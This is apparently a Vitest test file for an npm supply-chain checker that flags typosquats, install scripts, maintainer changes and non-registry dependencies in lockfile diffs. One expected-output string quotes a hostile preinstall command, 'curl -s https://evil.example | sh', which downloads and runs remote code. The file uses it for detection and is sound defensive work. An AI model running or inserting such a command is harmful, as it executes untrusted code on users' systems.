import { describe, expect, it } from "vitest";
import { runCheck } from "../src/check.js";
import { editDistance } from "../src/signals/index.js";
import { renderReport } from "../src/report.js";
import { defaultConfig } from "../src/types.js";
import { NOW, fakeRegistry, fixture } from "./helpers.js";

const run = (config = defaultConfig) =>
  runCheck({ baseLock: fixture("base-lock.json"), headLock: fixture("head-lock.json"), config, fetchPackument: fakeRegistry, now: NOW });

describe("runCheck", () => {
  it("flags the worm-style update, the typosquat, the git dep and the deprecated version", async () => {
    const { findings, failed } = await run();
    const got = findings.map((f) => `${f.severity} ${f.name} ${f.signal}`);
    expect(got).toEqual([
      "high @acme/utils fresh-version",
      "high @acme/utils install-script",
      "high reactt typosquat",
      "high reactt new-package",
      "high reactt install-script",
      "medium @acme/utils maintainer-change",
      "medium git-thing non-registry-source",
      "low left-pad deprecated",
    ]);
    expect(failed).toBe(true);
  });

  it("explains each finding in plain words", async () => {
    const { findings } = await run();
    const byKey = Object.fromEntries(findings.map((f) => [`${f.name} ${f.signal}`, f.reason]));
    expect(byKey["@acme/utils fresh-version"]).toBe("Version published 12h ago (under 72h)");
    expect(byKey["@acme/utils maintainer-change"]).toBe(
      "New maintainer(s): mallory; published by mallory, not a previous maintainer",
    );
    expect(byKey["reactt typosquat"]).toBe("Name is one letter away from `react`");
    expect(byKey["reactt install-script"]).toBe(
      "Has preinstall script that runs `curl`: `curl -s https://evil.example | sh`",
    );
  });

  it("respects allow list and failOn", async () => {
    const config = { ...defaultConfig, failOn: "none" as const, allow: ["reactt", "@acme/utils@2.0.1"] };
    const { findings, failed } = await run(config);
    expect(findings.map((f) => f.name)).toEqual(["git-thing", "left-pad"]);
    expect(failed).toBe(false);
  });

  it("treats a missing base lockfile as all-new", async () => {
    const r = await runCheck({ baseLock: null, headLock: fixture("base-lock.json"), config: defaultConfig, fetchPackument: fakeRegistry, now: NOW });
    expect(r.changes).toHaveLength(3);
  });
});

describe("renderReport", () => {
  it("renders a table with the marker", async () => {
    const md = renderReport(await run());
    expect(md).toContain("<!-- depgate-report -->");
    expect(md).toContain("Checked **4** new or updated packages. **4** flagged. ❌ This check fails.");
    expect(md).toContain("| 🔴 High | `reactt@1.0.0` | Name is one letter away from `react` |");
  });

  it("says so when nothing changed", () => {
    expect(renderReport({ changes: [], findings: [], failed: false })).toContain("No new or updated npm packages");
  });
});

describe("editDistance", () => {
  it("counts single edits", () => {
    expect(editDistance("lodahs", "lodash")).toBe(2);
    expect(editDistance("lodas", "lodash")).toBe(1);
    expect(editDistance("axios", "axios")).toBe(0);
  });
});
